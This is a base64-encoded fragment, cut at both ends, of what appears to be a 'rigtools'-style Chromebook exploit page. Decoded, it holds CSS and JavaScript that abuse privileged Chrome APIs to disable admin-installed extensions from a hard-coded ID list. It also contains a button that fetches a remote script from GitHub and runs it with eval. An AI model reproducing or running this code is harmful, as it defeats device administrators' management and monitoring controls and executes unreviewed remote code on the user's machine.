6IDA7CiAgYm90dG9tOiAwOwogIGJhY2tncm91bmQtY29sb3I6ICM0NDQ3NDY7CiAgYm9yZGVyLXJhZGl1czogMTVweDsKICBib3JkZXI6IDEuNXB4IHNvbGlkICM4ZTkxOGY7CiAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjFzIGVhc2UtaW4tb3V0LCBib3JkZXItY29sb3IgMC4xcyBlYXNlLWluLW91dDsKfQoKLnNsaWRlcjpiZWZvcmUgewogIGNvbnRlbnQ6ICIiOwogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBoZWlnaHQ6IDEycHg7CiAgd2lkdGg6IDEycHg7CiAgbGVmdDogMnB4OwogIHRvcDogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKSBzY2FsZSgwLjgpOwogIGJhY2tncm91bmQtY29sb3I6ICM4ZTkxOGY7CiAgYm9yZGVyLXJhZGl1czogNTAlOwogIHRyYW5zaXRpb246IHRyYW5zZm9ybSAwLjFzIGVhc2UtaW4tb3V0LCBiYWNrZ3JvdW5kLWNvbG9yIDAuMXMgZWFzZS1pbi1vdXQ7Cn0KCi5zd2l0Y2g6aG92ZXIgLnNsaWRlcjpiZWZvcmUgewogIGJveC1zaGFkb3c6IDAgMCA2cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpOwp9CgppbnB1dDpjaGVja2VkICsgLnNsaWRlciB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2E4YzdmYTsKICBib3JkZXItY29sb3I6ICNhOGM3ZmE7Cn0KCmlucHV0OmNoZWNrZWQgKyAuc2xpZGVyOmJlZm9yZSB7CiAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoMTBweCwgLTUwJSkgc2NhbGUoMSk7CiAgYmFja2dyb3VuZC1jb2xvcjogIzA2MmU2ZjsKfQoKLmhlYWRlciB7CiAgZGlzcGxheTogZmxleDsKICBhbGlnbi1pdGVtczogY2VudGVyOwogIGp1c3RpZnktY29udGVudDogY2VudGVyOwp9CgoubG9nbyB7CiAgd2lkdGg6IDRlbTsKICBoZWlnaHQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiAxMHB4Owp9CgoudGFibGlzdC1pdGVtIHsKICBib3JkZXI6IDFweCBzb2xpZCAjMzMzOwogIG1hcmdpbi1ib3R0b206IDEwcHg7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsKICBwYWRkaW5nOiAxNXB4OwogIGJvcmRlci1yYWRpdXM6IDhweDsKICBkaXNwbGF5OiBmbGV4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7Cn0KCi50YWJsaXN0LWl0ZW0gaW1nIHsKICBtYXgtd2lkdGg6IDI1cHg7CiAgbWFyZ2luLXJpZ2h0OiAxMHB4Owp9CgoudGFibGlzdC1pdGVtIHNwYW4gewogIHBhZGRpbmc6IDEwcHggMDsKICB0ZXh0LW92ZXJmbG93OiBlbGxpcHNpczsKICB3aWR0aDogMTAwJTsKICB3aGl0ZS1zcGFjZTogbm93cmFwOwogIG92ZXJmbG93OiBoaWRkZW47CiAgd29yZC1icmVhazogYnJlYWstYWxsOwp9CgoudGFibGlzdC1pdGVtIHNwYW46aG92ZXIgewogIG92ZXJmbG93OiB2aXNpYmxlOwogIHdoaXRlLXNwYWNlOiBub3JtYWw7CiAgaGVpZ2h0OiBhdXRvOwp9CgpidXR0b24gewogICAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7CiAgICBjb2xvcjogIzlkYmFlOTsKICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgYm9yZGVyOiAxcHggc29saWQgIzA0N2RiNzsKICAgIGJvcmRlci1yYWRpdXM6IDIwcHg7CiAgICBoZWlnaHQ6IDM1cHg7CiAgICBwYWRkaW5nOiA3cHggMTBweDsKICAgIGN1cnNvcjogcG9pbnRlcjsKICAgIGFsaWduLXNlbGY6IGZsZXgtZW5kOwogICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZCAwLjJzIGVhc2UtaW4tb3V0OwogICAgb3V0bGluZTogbm9uZTsKfQoKYnV0dG9uOmhvdmVyIHsKICAgIGJhY2tncm91bmQ6ICMzODM5M2I7Cn0KCmlucHV0IHsKICBwYWRkaW5nOiA4cHggMTZweDsKICBtYXJnaW46IDRweCAycHg7CiAgY29sb3I6IHdoaXRlOwogIGJhY2tncm91bmQtY29sb3I6ICMwYTBhMGE7CiAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKfQoKaW5wdXQ6aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICMxMTE7CiAgYm9yZGVyLWNvbG9yOiAjZmZmOwp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvbiB7CiAgcG9zaXRpb246IHJlbGF0aXZlOwogIGRpc3BsYXk6IGlubGluZS1mbGV4OwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAganVzdGlmeS1jb250ZW50OiBmbGV4LXN0YXJ0OwogIHBhZGRpbmc6IDlweCAxNXB4IDlweCA2MHB4OwogIGJhY2tncm91bmQtY29sb3I6IHdoaXRlOwogIGNvbG9yOiBibGFjazsKICBib3JkZXItcmFkaXVzOiA2cHg7CiAgbWFyZ2luOiA0cHggMnB4OwogIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4zcywgY29sb3IgMC4zczsKfQoKI3RvZ2dsZWFibGUtYnV0dG9ucyBidXR0b246aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7Cn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uOjpiZWZvcmUgewogIGNvbnRlbnQ6ICcnOwogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBsZWZ0OiAxMnB4OwogIHRvcDogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsKICB3aWR0aDogNDJweDsKICBoZWlnaHQ6IDIycHg7CiAgYmFja2dyb3VuZC1jb2xvcjogIzMzMzsKICBib3JkZXItcmFkaXVzOiAxMnB4Owp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvbjo6YWZ0ZXIgewogIGNvbnRlbnQ6ICcnOwogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICBsZWZ0OiAxNHB4OwogIHRvcDogNTAlOwogIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTsKICB3aWR0aDogMThweDsKICBoZWlnaHQ6IDE4cHg7CiAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsKICBib3JkZXItcmFkaXVzOiA1MCU7Cn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uW3RvZ2dsZWQ9InRydWUiXTo6YmVmb3JlIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvblt0b2dnbGVkPSJ0cnVlIl06OmFmdGVyIHsKICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTUwJSkgdHJhbnNsYXRlWCgyMHB4KTsKfQoKLmNvbnRhaW5lciB7CiAgZGlzcGxheTogZmxleDsKICBnYXA6IDEwcHg7Cn0KCiNjb2RlLXJ1biB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsKICBjb2xvcjogYmxhY2s7CiAgYm9yZGVyOiBub25lOwogIGJvcmRlci1yYWRpdXM6IDVweDsKICBwYWRkaW5nOiA4cHggMTZweDsKICBmb250LXdlaWdodDogYm9sZDsKICBjdXJzb3I6IHBvaW50ZXI7Cn0KCiNjb2RlLXJ1bjpob3ZlciB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2UyZTJlMjsKfQoKI2NvZGUgewogIGJhY2tncm91bmQ6ICMwMDA7CiAgY29sb3I6IHdoaXRlOwogIHdpZHRoOiAxMDAlOwogIG1pbi1oZWlnaHQ6IDUwcHg7CiAgaGVpZ2h0OiAyMDBweDsKICByZXNpemU6IGJvdGg7CiAgYm9yZGVyOiAxcHggc29saWQgIzRCNEI0RDsKICBib3JkZXItcmFkaXVzOiA1cHg7CiAgZm9udC1mYW1pbHk6IG1vbm9zcGFjZSwgc2Fucy1zZXJpZjsKICBwYWRkaW5nOiA4cHg7CiAgYm94LXNpemluZzogYm9yZGVyLWJveDsKfQoKI2NvZGU6Zm9jdXMgewogIGJvcmRlci1jb2xvcjogI2ZmZjsKfQoKLnRvYXN0W3BvcG92ZXJdOnBvcG92ZXItb3BlbiB7CiAgb3BhY2l0eTogMTsKICB0b3A6IDVweDsKICBsZWZ0OiA1MCU7Cn0KCkBzdGFydGluZy1zdHlsZSB7CiAgLnRvYXN0W3BvcG92ZXJdOnBvcG92ZXItb3BlbiB7CiAgICBvcGFjaXR5OiAwOwogICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0xMDAlKTsKICB9Cn0KCi50b2FzdFtwb3BvdmVyXSB7CiAgcG9zaXRpb246IGZpeGVkOwogIGluc2V0OiB1bnNldDsKICBwYWRkaW5nOiA1cHggMTBweDsKICBib3JkZXItcmFkaXVzOiA1cHg7CiAgb3BhY2l0eTogMDsKICBmb250LXdlaWdodDogYm9sZDsKICBiYWNrZ3JvdW5kOiAjMGEwYTBhOwogIGNvbG9yOiB3aGl0ZTsKICBib3JkZXI6IDFweCBzb2xpZCAjNDQ0Owp9CgpkaWFsb2cgewogIG9wYWNpdHk6IDA7CiAgcGFkZGluZzogMzBweDsKICBib3JkZXI6IDFweCBzb2xpZCAjMmQyZDJkOwogIGJhY2tncm91bmQ6ICMwMDA7CiAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KCMzMzMgMXB4LCB0cmFuc3BhcmVudCAxcHgpOwogIGJhY2tncm91bmQtc2l6ZTogMnJlbSAycmVtOwogIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgdHJhbnNpdGlvbjogYWxsIDAuNXM7CiAgbWluLXdpZHRoOiA1MHZ3OwogIG1pbi1oZWlnaHQ6IDYwdmg7CiAgbWF4LXdpZHRoOiA1MHZ3OwogIG1heC1oZWlnaHQ6IDYwdmg7CiAgZGlzcGxheTogZmxleDsKICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwp9CgpkaWFsb2dbb3Blbl0gewogIG9wYWNpdHk6IDE7CiAgdHJhbnNmb3JtOiBzY2FsZSgxKTsKfQoKZGlhbG9nOjpiYWNrZHJvcCB7CiAgYmFja2dyb3VuZDogcmdiYSgwLCAwLCAwLCAwLjI1KTsKICBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoM3B4KTsKfQoKZGlhbG9nIGRpdiB7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsKICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKfQoKZGlhbG9nIHAgewogIG1hcmdpbi1ib3R0b206IDlweDsKICBwYWRkaW5nOiA5cHg7CiAgYm9yZGVyOiAxcHggc29saWQgIzI3MjcyYTsKICBmb250LXdlaWdodDogNzAwOwp9CgpkaWFsb2cgaDEgewogIGZvbnQtc2l6ZTogMS41cmVtOwogIGNvbG9yOiB3aGl0ZTsKICBmb250LXdlaWdodDogOTAwOwp9Cgp3aGl0ZWJ1dHRvbnMgYnV0dG9uIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiB3aGl0ZTsKICBib3JkZXI6IG5vbmU7CiAgY29sb3I6IGJsYWNrOwp9Cgp3aGl0ZWJ1dHRvbnMgYnV0dG9uOmhvdmVyIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTJlMmUyOwp9CgpsaXRzdHVmZiB7CiAgY29sb3I6ICM0NDQ7CiAgZm9udC1mYW1pbHk6IG1vbm9zcGFjZSwgc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDEycHg7CiAgZm9udC1zdHlsZTogaXRhbGljOwogIG1hcmdpbi1sZWZ0OiA2cHg7Cn0KICAgIDwvc3R5bGU+CiAgYDsKCm9ubG9hZCA9IGFzeW5jIGZ1bmN0aW9uIHgoKSB7CiAgICBsZXQgZm91bmROb3RoaW5nID0gdHJ1ZTsKICAgIGRvY3VtZW50Lm9wZW4oKTsKICAgIHRoaXMuZG9jdW1lbnQud3JpdGUoaHRtbFN0eWxlKTsKICAgIGRvY3VtZW50LmNsb3NlKCk7CgogICAgaWYgKGNocm9tZS5maWxlTWFuYWdlclByaXZhdGUpIHsKICAgICAgICBjaHJvbWUuZmlsZU1hbmFnZXJQcml2YXRlLm9wZW5VUkwoImRhdGE6dGV4dC9odG1sLDxoMT5IZWxsbzwvaDE+Iik7CiAgICAgICAgZG9jdW1lbnQud3JpdGUoZmlsZU1hbmFnZXJQcml2YXRlVGVtcGxhdGUpOwogICAgICAgIGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2J0bl9GTVBfb3BlblVSTCIpLm9uY2xpY2sgPSBmdW5jdGlvbihldikge307CiAgICB9CgogICAgaWYgKGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQpIHsKICAgICAgICBkb2N1bWVudC5ib2R5Lmluc2VydEFkamFjZW50SFRNTCgiYmVmb3JlZW5kIiwgbWFuYWdlbWVudFRlbXBsYXRlKTsKICAgICAgICBjb25zdCBleHRsaXN0X2VsZW1lbnQgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuZXh0bGlzdCIpOwoKICAgICAgICBhd2FpdCB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KTsKICAgICAgICBjb25zdCBjb250YWluZXJfZXh0ZW5zaW9ucyA9IGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigKICAgICAgICAgICAgIiNjaHJvbWVfbWFuYWdlbWVudF9kaXNhYmxlX2V4dCIKICAgICAgICApOwoKICAgICAgICBjb250YWluZXJfZXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjY3VycmVudC1leHRlbnNpb24iKS5vbmNsaWNrID0KICAgICAgICAgICAgYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBncmFiaWR0b2tpbGwgPSBjaHJvbWUucnVudGltZS5pZDsKICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKGdyYWJpZHRva2lsbCwgZmFsc2UpOwogICAgICAgICAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgYWxlcnQoInVuc3VjY2Vzc2Z1bCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9OwoKICAgICAgICBjb250YWluZXJfZXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjcm12LWNtbi1ibHQiKS5vbmNsaWNrID0gZnVuY3Rpb24gZGYoKSB7CiAgICAgICAgICAgIGNvbnN0IGJsb2F0SWRzID0gWwogICAgICAgICAgICAgICAgImNnYmJiam1nZHBuaWZpamNvbmhhbWdnamVobGFtY2lmIiwKICAgICAgICAgICAgICAgICJsZmtiYm1jbG5wYWlocGFhamhvaGhmZGplbGNoa2lrZiIsCiAgICAgICAgICAgICAgICAibmNib2ZuaG1tZmZmbWNkbWJqZmFpZ2Vwa2dtam5sbmUiLAogICAgICAgICAgICAgICAgInBvaG1nb2JkZWFqZW1jaWZwb2xkbm5oZmZqbm5raGdmIiwKICAgICAgICAgICAgICAgICJiZWNkcGxmYWxvb2ZsYW5pcGpvYmxjbXBhZWtrYmJoZSIsCiAgICAgICAgICAgICAgICAiZmVlcG1kbG1ocGxhb2phYmVvZWNhb2JmbWlib29haWQiLAogICAgICAgICAgICAgICAgImFka2Nwa3BnaGFobWJvcGtqY2hvYmllY2tlb2FvZWVtIiwKICAgICAgICAgICAgICAgICJoYWxkbGdsZHBsZ25nZ2tqYWFmaGVsZ2lhZ2xhZmFuaCIsCiAgICAgICAgICAgICAgICAiZmlsZ3Bqa2RtamlubWpiZXBicG1uZm9ibWptZ2ltb24iLAogICAgICAgICAgICAgICAgImtrYm1kZ2pnZ2NkYWpja2RsYm5nZGpvbnBjaHBhaWVhIiwKICAgICAgICAgICAgICAgICJuamRuaWNsZ2VnaWpkY2RsaWtsZ2llaWNhbnBtY25naiIsCiAgICAgICAgICAgICAgICAiaHBrZG9rYWtqZ2xwcGVla2ZlZWttZWJmYWhhZG5mbHAiLAogICAgICAgICAgICBdOwoKICAgICAgICAgICAgbGV0IGV4dHMgPSB7fTsKICAgICAgICAgICAgbGV0IGV4dGxuZ3RoID0gMDsKCiAgICAgICAgICAgIGZ1bmN0aW9uIGdldExlbmd0aCgpIHsKICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gewogICAgICAgICAgICAgICAgICAgIGJsb2F0SWRzLmZvckVhY2goKGlkLCBpKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbkV4aXN0cyhpZCkudGhlbigocmVzKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAocmVzKSBleHRsbmd0aCsrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGJsb2F0SWRzLmxlbmd0aCAtIDEgPT09IGkpIHJlc29sdmUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gaW5pdEV4dE9iaigpIHsKICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gewogICAgICAgICAgICAgICAgICAgIGJsb2F0SWRzLmZvckVhY2goKGlkKSA9PgogICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXQoaWQsIChlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3QuYXNzaWduKGV4dHMsIEpTT04ucGFyc2UoYHsiJHtlLmlkfSI6IiR7ZS5zaG9ydE5hbWV9In1gKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoT2JqZWN0LmtleXMoZXh0cykubGVuZ3RoID09IGV4dGxuZ3RoKSByZXNvbHZlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CgogICAgICAgICAgICBnZXRMZW5ndGgoKS50aGVuKCgpID0+CiAgICAgICAgICAgICAgICBpbml0RXh0T2JqKCkudGhlbigoKSA9PgogICAgICAgICAgICAgICAgICAgIG1ha2VEaWFsb2coCiAgICAgICAgICAgICAgICAgICAgICAgICJBcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGlzYWJsZSB0aGUgZm9sbG93aW5nIGV4dGVuc2lvbnM/IiwKICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LnZhbHVlcyhleHRzKSwKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7fSwKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlzYWJsZWRFeHRzID0gW107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3Qua2V5cyhleHRzKS5mb3JFYWNoKChpZCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldChpZCwgKGUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGUuZW5hYmxlZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlkID09IGNocm9tZS5ydW50aW1lLmlkKSByZXR1cm47CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLnB1c2goZS5zaG9ydE5hbWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChpZCwgZmFsc2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWRpc2FibGVkRXh0cy5sZW5ndGggPCAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1ha2VUb2FzdCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJkaXNhYmxlZCB0aGUgZm9sbG93aW5nIGV4dGVuc2lvbnM6XHJcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLmpvaW4oIlxyXG4iKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlRXh0ZW5zaW9uU3RhdHVzKGV4dGxpc3RfZWxlbWVudCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMjUwKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgKTsKICAgICAgICB9OwoKICAgICAgICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSA9PSBKU09OLnN0cmluZ2lmeShbXSkpIHsKICAgICAgICAgICAgY29udGFpbmVyX2V4dGVuc2lvbnMKICAgICAgICAgICAgICAgIC5xdWVyeVNlbGVjdG9yKCIjZGlzYWJsZS11c2VyZGVmLWV4dHMiKQogICAgICAgICAgICAgICAgLnNldEF0dHJpYnV0ZSgic3R5bGUiLCAiZGlzcGxheTogbm9uZTsiKTsKICAgICAgICB9CgogICAgICAgIGNvbnRhaW5lcl9leHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiNkaXNhYmxlLXVzZXJkZWYtZXh0cyIpLm9uY2xpY2sgPQogICAgICAgICAgICBmdW5jdGlvbiBkZihlKSB7CiAgICAgICAgICAgICAgICBsZXQgZXh0cyA9IHt9OwoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGluaXRFeHRPYmooKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IGlkbGlzdCA9IEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlkbGlzdC5mb3JFYWNoKChpZCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0KGlkLCAoZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC5hc3NpZ24oZXh0cywgSlNPTi5wYXJzZShgeyIke2UuaWR9IjoiJHtlLnNob3J0TmFtZX0ifWApKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoT2JqZWN0LmtleXMoZXh0cykubGVuZ3RoID09IGlkbGlzdC5sZW5ndGgpIHJlc29sdmUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpbml0RXh0T2JqKCkudGhlbigoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgbWFrZURpYWxvZygKICAgICAgICAgICAgICAgICAgICAgICAgIkFyZSB5b3Ugc3VyZSB5b3Ugd2FudCB0byBkaXNhYmxlIHRoZSBmb2xsb3dpbmcgZXh0ZW5zaW9ucz8iLAogICAgICAgICAgICAgICAgICAgICAgICBPYmplY3QudmFsdWVzKGV4dHMpLAogICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpIHt9LAogICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBkaXNhYmxlZEV4dHMgPSBbXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSkuZm9yRWFjaCgoaWQpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXQoaWQsIChlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlLmVuYWJsZWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpZCA9PSBjaHJvbWUucnVudGltZS5pZCkgcmV0dXJuOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5wdXNoKGUuc2hvcnROYW1lKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoaWQsIGZhbHNlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFkaXNhYmxlZEV4dHMubGVuZ3RoIDwgMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYWtlVG9hc3QoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGlzYWJsZWQgdGhlIGZvbGxvd2luZyBleHRlbnNpb25zOlxyXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5qb2luKCJcclxuIiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMubGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDI1MCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH07CiAgICB9CiAgICBjb25zdCBvdGhlckZlYXR1cmVzID0gd2luZG93LmNocm9tZS5ydW50aW1lLmdldE1hbmlmZXN0KCk7CiAgICBjb25zdCBwZXJtaXNzaW9ucyA9IG90aGVyRmVhdHVyZXMucGVybWlzc2lvbnM7CgogICAgbmV3IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMoKS5hY3RpdmF0ZSgpOwogICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoCiAgICAgICAgImJlZm9yZWVuZCIsCiAgICAgICAgYAogICAgICA8dGl0bGU+VW50aXRsZWQgZG9jdW1lbnQ8L3RpdGxlPgogICAgICA8bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluLyI+CiAgICAgIGAKICAgICk7CgogICAgY29uc3QgU2NyaXB0QnV0dG9ucyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNvdGhlci1idXR0b25zIik7CgogICAgU2NyaXB0QnV0dG9ucy5xdWVyeVNlbGVjdG9yKCIjc3dhbXAiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIGZldGNoKAogICAgICAgICAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UM00xTjRML3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL3NjcmlwdHMvc3dhbXAtdWx0cmEuanMiCiAgICAgICAgICAgICkKICAgICAgICAgICAgLnRoZW4oKHJlcykgPT4gcmVzLnRleHQoKSkKICAgICAgICAgICAgLnRoZW4oZXZhbCk7CiAgICB9OwoKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI3VwZGF0ZSIpLm9uY2xpY2sgPSBhc3luYyBmdW5jdGlvbiBkZihlKSB7CiAgICAgICAgKGFzeW5jICgpID0+IHsKICAgICAg